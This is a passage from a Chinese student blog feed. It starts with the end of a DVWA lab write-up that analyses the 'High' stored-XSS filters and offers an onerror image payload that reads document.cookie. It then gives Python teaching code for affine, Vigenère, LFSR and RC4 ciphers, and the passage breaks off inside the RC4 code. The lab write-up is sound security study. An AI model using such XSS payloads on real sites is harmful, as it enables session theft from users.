    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );
<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre>

<p> <code>strip_tags() </code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
<p> <code>addslashes() </code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
<p> <code>htmlspecialchars() </code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
<p>name,执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code> /i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt; </code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
<p>只能换一个标签</p>
<pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre>



]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>blind sql</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学</title>
    <url>/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<p>密码学实验课程设计</p>
<span id="more"></span>

<h1 id="一、古典密码"><a href="#一、古典密码" class="headerlink" title="一、古典密码"></a>一、古典密码</h1><h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换</p>
<h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p>假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文</p>
<p>加密函数：Y&#x3D;（AX+B）%26</p>
<p>解密函数：Y&#x3D;（AX+B）%26，得到：X&#x3D;（A的逆元）*（Y-B）%26</p>
<p>原理很简单，代码实现也比较简单</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>各个函数作用</p>
<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span></span>  求<span class="hljs-selector-tag">a</span>,b的最大公因子
<span class="hljs-function"><span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span></span>  计算a模m的逆元
<span class="hljs-function"><span class="hljs-title">encode</span><span class="hljs-params">(a,b,s)</span></span>       仿射加密
<span class="hljs-function"><span class="hljs-title">decode</span><span class="hljs-params">(a,b,s)</span></span>		仿射解密</code></pre>

<p>利用扩展的欧几里得算法求逆元</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a,b</span>):  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-keyword">def</span> <span class="hljs-title function_">findModReverse</span>(<span class="hljs-params">a,m</span>): <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m</code></pre>

<p>完整代码如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a,b</span>):  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-keyword">def</span> <span class="hljs-title function_">findModReverse</span>(<span class="hljs-params">a,m</span>): <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m

<span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">a,b,s</span>):
    result = <span class="hljs-string">&quot;&quot;</span>          <span class="hljs-comment"># 保存加密结果</span>
    s = s.upper()		 <span class="hljs-comment"># 全部转换为大写，方便计算</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>((a*(<span class="hljs-built_in">ord</span>(s[i])-<span class="hljs-number">65</span>)+b)%<span class="hljs-number">26</span> + <span class="hljs-number">65</span>)  <span class="hljs-comment">#使用加密公式 Y=（AX+B）%26</span>
        result = result +s2
    <span class="hljs-built_in">print</span>(result.lower())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">a,b,s</span>):
    a1 = findModReverse(a,<span class="hljs-number">26</span>)
    result = <span class="hljs-string">&quot;&quot;</span>
    s = s.upper()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>((a1 * (<span class="hljs-built_in">ord</span>(s[i]) - <span class="hljs-number">65</span> - b)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>) <span class="hljs-comment"># 使用解密公式X=（A的逆元）*（Y-B）%26</span>
        result = result + s2
    <span class="hljs-built_in">print</span>(result.lower())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">s_decode</span>(<span class="hljs-params">a,b,s</span>):
    letter =<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>
    letter = letter.upper()
    s = s.upper()
    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(letter)):
            <span class="hljs-keyword">if</span> i == letter[(a*j+b)%<span class="hljs-number">26</span>]:
                result = result+letter[j]
    <span class="hljs-built_in">print</span>(result.lower())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():										<span class="hljs-comment"># 主函数入口</span>
    answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&#x27;E&#x27;</span>:
            a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入a:&#x27;</span>))
            b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入b:&#x27;</span>))
            s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入需要加密的字符:&#x27;</span>)
            encode(a, b, s)
        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&#x27;D&#x27;</span>:
            a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入a:&#x27;</span>))
            b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入b:&#x27;</span>))
            s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入需要解密的字符：&#x27;</span>)
            decode(a, b, s)  <span class="hljs-comment"># 利用逆元解密</span>
            <span class="hljs-comment"># s_decode(a,b,s)   # 暴力枚举每一个字符</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;输入错误！&#x27;</span>)
    <span class="hljs-keyword">except</span> KeyError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请勿输入空格！&#x27;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()
<span class="hljs-comment"># a = 7, b = 22</span>
<span class="hljs-comment"># plain = firstthesentenceandthentheevidencesaidthequeen</span>
<span class="hljs-comment"># crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj</span></code></pre>

<p>加解密结果如图所示</p>
<p><img src="https://i.loli.net/2020/12/23/CqbfOdNB3mxHDt4.png" alt="image-20201223225306141"></p>
<p><img src="https://i.loli.net/2020/12/23/CZHiL8cDjlUdvSw.png" alt="image-20201223225317161"></p>
<h3 id="破解仿射密码"><a href="#破解仿射密码" class="headerlink" title="破解仿射密码"></a>破解仿射密码</h3><p>这里使用了加解密中的 <code>gcd</code> <code>findModReverse</code>，找出26以内且与26互素的所有数的逆元，并存放在一个列表中</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">findAllre</span>():    <span class="hljs-comment"># 找出所有小于26且与26互素的数</span>
    re_all = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):
        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:
            res = findModReverse(i,<span class="hljs-number">26</span>)
            re_all.append(res)
    <span class="hljs-comment">#re_all.sort()</span>
    <span class="hljs-keyword">return</span> re_all</code></pre>

<p>完整代码如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a,b</span>):  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-keyword">def</span> <span class="hljs-title function_">findModReverse</span>(<span class="hljs-params">a,m</span>): <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m

<span class="hljs-keyword">def</span> <span class="hljs-title function_">findAllre</span>():    <span class="hljs-comment"># 找出所有小于26且与26互素的数</span>
    re_all = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):
        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:
            res = findModReverse(i,<span class="hljs-number">26</span>)
            re_all.append(res)
    <span class="hljs-comment">#re_all.sort()</span>
    <span class="hljs-keyword">return</span> re_all

<span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">s</span>):
    re_all = findAllre()
    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> re_all:
        <span class="hljs-keyword">for</span> k2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):
            result = <span class="hljs-string">&quot;&quot;</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):
                s2 = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">int</span>(k1) * (<span class="hljs-built_in">ord</span>(s[i]) - <span class="hljs-number">97</span> - k2)) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>))
                result = result + s2
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;k1=&quot;</span> + <span class="hljs-built_in">str</span>(findModReverse(k1,<span class="hljs-number">26</span>)) + <span class="hljs-string">&quot;, k2=&quot;</span> + <span class="hljs-built_in">str</span>(k2) + <span class="hljs-string">&quot; plaintext = &quot;</span> + result)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
   <span class="hljs-comment"># criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27;</span>
    criphertext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要破解的密文: &quot;</span>)
    criphertext = criphertext.lower()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------&quot;</span>*<span class="hljs-number">3</span>+<span class="hljs-string">&quot;strat attck&quot;</span>+<span class="hljs-string">&quot;---------&quot;</span>*<span class="hljs-number">3</span>)
    decode(criphertext)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
     main()</code></pre>

<p>效果如下</p>
<img src="https://i.loli.net/2020/12/23/lrQLWVebkuphvTK.png" alt="image-20201223170037595" style="zoom:67%;">

<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列<a href="https://baike.baidu.com/item/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81">凯撒密码</a>组成密码字母表的加密算法，属于多表密码的一种简单形式。</p>
<p>维吉尼亚密码曾多次被发明。该方法最早记录在<a href="https://baike.baidu.com/item/%E5%90%89%E5%A5%A5%E4%B8%87%C2%B7%E5%B7%B4%E8%92%82%E6%96%AF%E5%A1%94%C2%B7%E8%B4%9D%E6%8B%89%E7%B4%A2">吉奥万·巴蒂斯塔·贝拉索</a>（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（<a href="https://baike.baidu.com/item/%E6%84%8F%E5%A4%A7%E5%88%A9%E8%AF%AD">意大利语</a>：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是<a href="https://baike.baidu.com/item/%E6%B3%95%E5%9B%BD">法国</a>外交官<a href="https://baike.baidu.com/item/%E5%B8%83%E8%8E%B1%E6%96%AF%C2%B7%E5%BE%B7%C2%B7%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A">布莱斯·德·维吉尼亚</a>（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。</p>
<p>维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。</p>
<h3 id="2-加解密原理"><a href="#2-加解密原理" class="headerlink" title="2.加解密原理"></a>2.加解密原理</h3><img src="https://i.loli.net/2020/12/23/DFHntXC9Ysp6dyV.png" alt="image-20201223225441528" style="zoom:67%;">



<p>加解密代码</p>
<pre><code class="hljs python"><span class="hljs-comment"># 将密钥处理成和密文/明文一样长</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_key</span>(<span class="hljs-params">s,key</span>):
    nkey = key
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(nkey) &lt; <span class="hljs-built_in">len</span>(s):
        nkey = nkey+key
    nkey = nkey[:<span class="hljs-built_in">len</span>(s)]
    <span class="hljs-keyword">return</span> nkey

<span class="hljs-comment"># 加密函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">s,key</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;加密后的结果： &#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)
    s1 = s.upper()
    key1 = solve_key(s, key)
    key1 = key1.upper()

    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">abs</span>(((<span class="hljs-built_in">ord</span>(s1[i])-<span class="hljs-number">65</span>)+(<span class="hljs-built_in">ord</span>(key1[i])-<span class="hljs-number">65</span>)) % <span class="hljs-number">26</span>) + <span class="hljs-number">65</span>)
        result = result + s2
    <span class="hljs-built_in">print</span>(result.lower())

<span class="hljs-comment"># 解密函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">s,key</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;解密后的结果： &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)
    s1 = s.upper()
    key1 = solve_key(s, key)
    key1 = key1.upper()

    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(s1[i]) - <span class="hljs-number">65</span>) - (<span class="hljs-built_in">ord</span>(key1[i]) - <span class="hljs-number">65</span>)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)
        result = result + s2
    <span class="hljs-built_in">print</span>(result.lower())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        <span class="hljs-comment"># 函数入口</span>
        answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;请输入所需的操作：编码/E or 解码/D:  &#x27;</span>)
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&#x27;E&#x27;</span>:
                key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密钥: &#x27;</span>)
                key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, key))
                s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入明文: &#x27;</span>)
                s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, s))  <span class="hljs-comment"># 将字符串中的非字母字符去掉</span>
                <span class="hljs-comment"># print(s)</span>
                encode(s, key)
            <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&#x27;D&#x27;</span>:
                key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密钥: &#x27;</span>)
                key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, key))
                s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文: &#x27;</span>)
                s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, s))
                decode(s, key)
            <span class="hljs-keyword">else</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;输入错误！&#x27;</span>)
        <span class="hljs-keyword">except</span> KeyError:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请检查输入是否正确！&#x27;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>





<h1 id="二、序列密码"><a href="#二、序列密码" class="headerlink" title="二、序列密码"></a>二、序列密码</h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>代码实现</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">lsrf</span>(<span class="hljs-params">inti, top</span>):
    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span>
    inti2 = <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-built_in">len</span>(inti)
    inti2 = <span class="hljs-built_in">list</span>(inti2)
    inti1 = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inti)):
        <span class="hljs-keyword">if</span> top[i] == <span class="hljs-string">&quot;1&quot;</span>:
            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(inti[i])
    <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> % <span class="hljs-number">2</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inti)):
        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
            inti2[i] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">sum</span>)
        <span class="hljs-keyword">else</span>:
            inti2[i] = inti[i - <span class="hljs-number">1</span>]
    inti1 = inti1.join(inti2)
    <span class="hljs-keyword">return</span> inti1

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    inti_str = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入初始化序列：&quot;</span>))
    inti_str = inti_str[::-<span class="hljs-number">1</span>]
    inti_str_backup = inti_str
    top = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入本原多项式：&quot;</span>))
    top = top[::-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i == <span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) - <span class="hljs-number">1</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;0&#125;次&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;是本原多项式且周期是&quot;</span> + <span class="hljs-built_in">str</span>(i))
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">elif</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i != <span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) - <span class="hljs-number">1</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;0&#125;次&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不是本原多项式且周期是&quot;</span> + <span class="hljs-built_in">str</span>(i))
            <span class="hljs-keyword">break</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;0&#125;次&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)
        inti_str_backup = lsrf(inti_str_backup, top)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>

<p>选择本原多项式和初始序列如下</p>
<pre><code class="hljs">100000000001000000
011100010100100101</code></pre>

<p>程序运行结果</p>
<p><img src="https://i.loli.net/2020/12/23/gfbRGZ57piKChWS.png" alt="image-20201223222649800"></p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>完整代码</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> base64

<span class="hljs-comment"># S盒初始化置换,Key为密钥</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">Rc4_init</span>(<span class="hljs-params">S, Key</span>):
    j = <span class="hljs-number">0</span>
    Key = Key.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)
    Key = hashlib.md5(Key).hexdigest()  <span class="hljs-comment"># 长度为32的字符串</span>
    tmp = []
